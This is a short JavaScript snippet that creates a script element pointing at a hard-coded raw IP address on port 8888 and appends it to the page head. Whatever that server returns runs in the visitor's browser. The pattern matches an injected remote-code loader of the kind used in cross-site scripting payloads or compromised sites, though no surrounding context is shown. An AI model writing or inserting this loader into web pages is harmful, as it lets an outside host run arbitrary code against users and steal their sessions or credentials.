
const serverIP = '195.201.121.249';
const serverPort = '8888';
// Create a new script tag
const serverUrl = `http://${serverIP}:${serverPort}`;

var script = document.createElement('script');

// Set the src of the script to your server
script.src = serverUrl;

// Append the script tag to the head of the document
document.head.appendChild(script);
